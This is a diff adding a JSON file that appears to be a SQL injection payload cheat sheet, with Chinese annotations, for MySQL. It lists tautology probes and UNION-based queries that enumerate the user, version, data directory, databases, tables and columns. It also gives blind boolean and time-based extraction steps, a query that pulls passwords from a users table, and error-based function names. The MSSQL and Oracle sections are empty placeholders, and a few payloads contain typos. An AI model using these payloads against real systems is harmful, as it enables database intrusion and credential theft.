@@ -1,0 +1,83 @@
+{
+  "MYSQL":{
+      "public":{
+          "panduan":"or 1=1--+\n'or 1=1--+\n\"or 1=1--+\n)or 1=1--+\n')or 1=1--+\n\") or 1=1--+\n\"))or 1=1--+\nand 1=1--+\n'and 1=1--+\n\"and 1=1--+\n)and 1=1--+\n')and 1=1--+\n\") and 1=1--+\n\"))and 1=1--+",
+          "chaxunliehshu":"id=1' order by 1 --+\nid=1' UNION SELECT 1,2,3 --+",
+          "user":"id=1' and 1=2 UNION SELECT 1,user(),3 --+",
+          "version":"id=1' and 1=2 UNION SELECT 1,version(),3 --+",
+          "path":"id=1' and 1=2 UNION SELECT 1,@@datadir,3 --+"
+      },
+      "Order":{
+          "single_databases":"id=1' and 1=2 UNION select 1,2, schema_name from information_schema.schemata limit 0,1 --+",
+          "current_databases":"id=1' and 1=2 UNION SELECT 1,database(),3 --+",
+          "all_databases":"id=1' and 1=2 UNION SELECT 1,2,group_concat(schema_name) from information_schema.schemata --+\nid=1' and 1=2 UNION SELECT 1,2,CONCAT_WS(',',schema_name) from information_schema.schemata --+",
+          "single_tables":"id=1' and 1=2 UNION select 1,2,TABLE_NAME from information_schema.tables where TABLE_SCHEMA=database() limit 0,1 --+\nid=1' and select 1,2,TABLE_NAME from information_schema.tables where TABLE_SCHEMA='test' limit 0,1 --+\n数据库名可以用十六进制表示",
+          "all_tables":"id=1' and 1=2 UNION select 1,2, group_concat(TABLE_NAME) from information_schema.tables where TABLE_SCHEMA='mysql'\nid=1' and select 1,2,group_concat(TABLE_NAME) from information_schema.tables where TABLE_SCHEMA=database()",
+          "single_columns":"id=1' and 1=2 UNION select  1,2,COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME='users' limit 0,1)),1)--+",
+          "all_columns":"id=1' and 1=2 UNION SELECT 1,2,group_concat(column_name) from information_schema.columns where table_name='users' --+"
+      },
+      "Blinds":{
+          "mangzhu_databases":"猜解当前数据库名的长度\n1' and length(database())=1 #\n\n采用二分法猜解数据库名\n1' and ascii(substr(databse(),1,1))>97 #\n1' and left(database(),1)>'a' #\n1' and if(ascii(substr(database(),1,1))>100,sleep(10),sleep(2)) #\n1' and ascii(substr((select schema_name from information_schema.schemata limit 0,1),1,1))>97 #\n1' and left((select schema_name from information_schema.schemata limit 0,1),1)>'a' #\n",
+          "mangzhu_tables":"判断表个数\n1' and (select count (table_name) from information_schema.tables where table_schema=database())=1 #\n\n判断表名长度\n1' and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9 #显示存在\n说明第一个表名长度为 9 。\n\n判断表名称\n1' and left((select table_name from information_schema.tables where table_schema=database() limit 0,1),1)>'a' #\n1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))>103 # 显示不存在\n说明第一个表的名字的第一个字符为小写字母g。",
+          "mangzhu_columns":"判断users表列个数\n1' and (select count (COLUMN_NAME) from information_schema.COLUMNS where TABLE_NAME='users')=1 #\n\n判断第一列长度\n1' and length(substr(select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME='users' limit 0,1),1)=9 #显示存在\n说明第一列长度为 9 。\n\n判断列名称\n1' and left((select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME='users' limit 0,1),1)>'a' #\n1' and ascii(substr((select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME='users' limit 0,1),1,1))>103 # 显示不存在\n说明第一个表的名字的第一个字符为小写字母g。"
+      },
+      "others":{
+          "data":"id=1' and 1=2 UNION select 1,2,password from test.users limit 1,1\nid=1' and 1=2 UNION select 1,2, group_concat(password) from 'users' where user='admin'",
+          "others":"报错函数\n1、floor()\n2、extractvalue()\n3、updatexml()\n4、geometrycollection()\n5、multipoint()\n6、polygon()\n7、multipolygon()\n8、linestring()\n9、multilinestring()\n10、exp()"
+      }
+  },
+  "MSSQL":{
+      "public":{
+          "panduan":"暂无",
+          "chaxunliehshu":"暂无",
+          "user":"暂无",
+          "version":"暂无",
+          "path":"暂无"
+      },
+      "Order":{
+          "single_databases":"暂无",
+          "current_databases":"暂无",
+          "all_databases":"暂无",
+          "single_tables":"暂无",
+          "all_tables":"暂无",
+          "single_columns":"暂无",
+          "all_columns":"暂无"
+      },
+      "Blinds":{
+          "mangzhu_databases":"暂无",
+          "mangzhu_tables":"暂无",
+          "mangzhu_lumns":"暂无"
+      },
+      "others":{
+          "data":"暂无",
+          "others":"暂无"
+      }
+  },
+  "ORACLE":{
+      "public":{
+          "panduan":"暂无",
+          "chaxunliehshu":"暂无",
+          "user":"暂无",
+          "version":"暂无",
+          "path":"暂无"
+      },
+      "Order":{
+          "single_databases":"暂无",
+          "current_databases":"暂无",
+          "all_databases":"暂无",
+          "single_tables":"暂无",
+          "all_tables":"暂无",
+          "single_columns":"暂无",
+          "all_columns":"暂无"
+      },
+      "Blinds":{
+          "mangzhu_databases":"暂无",
+          "mangzhu_tables":"暂无",
+          "mangzhu_lumns":"暂无"
+      },
+      "others":{
+          "data":"暂无",
+          "others":"暂无"
+      }
+  }
+}
